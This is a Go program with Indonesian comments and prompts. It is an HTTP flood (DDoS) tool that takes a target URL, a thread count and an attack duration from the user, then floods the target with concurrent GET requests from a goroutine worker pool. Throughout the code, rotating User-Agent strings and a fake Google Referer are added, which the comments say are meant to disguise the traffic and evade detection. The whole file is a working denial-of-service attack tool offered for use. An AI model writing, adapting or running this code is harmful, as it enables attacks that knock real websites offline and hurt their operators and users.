package main

import (
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"runtime"
	"sync"
	"time"
)

// Header acak untuk menyamarkan lalu lintas
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)",
	"Mozilla/5.0 (Android 10; Mobile; rv:68.0)",
}

var transport = &http.Transport{
	MaxIdleConns:        100,
	IdleConnTimeout:     10 * time.Second,
	DisableCompression:  true,
}

var client = &http.Client{
	Transport: transport,
	Timeout:   5 * time.Second,
}

func main() {
	// Maksimalkan penggunaan CPU
	runtime.GOMAXPROCS(runtime.NumCPU())

	var url string
	var numThreads, attackDuration int

	// Input pengguna
	fmt.Print("Masukkan URL target: ")
	fmt.Scanln(&url)
	fmt.Print("Masukkan jumlah thread (1-1000): ")
	fmt.Scanln(&numThreads)
	fmt.Print("Masukkan durasi serangan dalam detik (1-3600): ")
	fmt.Scanln(&attackDuration)

	// Deteksi jenis server
	serverType := detectWebServer(url)
	if serverType == "Tidak Diketahui" {
		fmt.Println("Jenis server tidak diketahui, tidak dapat melanjutkan.")
		return
	}

	fmt.Printf("Memulai serangan DDoS ke %s dengan %d thread selama %d detik...\n", url, numThreads, attackDuration)

	// Inisialisasi worker pool
	var wg sync.WaitGroup
	jobs := make(chan bool, numThreads)
	endTime := time.Now().Add(time.Duration(attackDuration) * time.Second)

	// Luncurkan worker pool
	workerPool(url, numThreads, jobs, endTime, &wg)

	// Isi pekerjaan untuk worker
	for time.Now().Before(endTime) {
		jobs <- true
	}
	close(jobs)
	wg.Wait()

	fmt.Println("Serangan selesai.")
}

// Fungsi deteksi server web
func detectWebServer(url string) string {
	resp, err := client.Head(url)
	if err != nil {
		fmt.Println("Error: Tidak dapat terhubung ke server")
		return "Tidak Diketahui"
	}
	defer resp.Body.Close()

	server := resp.Header.Get("Server")
	if server == "" {
		return "Tidak Diketahui"
	}
	fmt.Printf("Jenis Web Server yang terdeteksi: %s\n", server)
	return server
}

// Fungsi untuk mengirim permintaan HTTP
func sendRequest(url string) {
	req, _ := http.NewRequest("GET", url, nil)

	// Header acak untuk menghindari deteksi
	headers := map[string]string{
		"User-Agent":      userAgents[rand.Intn(len(userAgents))],
		"Accept":          "text/html,application/xhtml+xml",
		"Accept-Language": "en-US,en;q=0.5",
		"Referer":         "https://google.com",
		"Connection":      "keep-alive",
	}

	// Atur header ke permintaan
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Printf("Request gagal: %v\n", err)
		return
	}

	io.Copy(io.Discard, resp.Body)
	fmt.Printf("Status: %d\n", resp.StatusCode)
	resp.Body.Close()
}

// Fungsi untuk membuat worker pool
func workerPool(url string, workers int, jobs chan bool, endTime time.Time, wg *sync.WaitGroup) {
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for range jobs {
				if time.Now().After(endTime) {
					return
				}
				sendRequest(url)
			}
		}()
	}
}
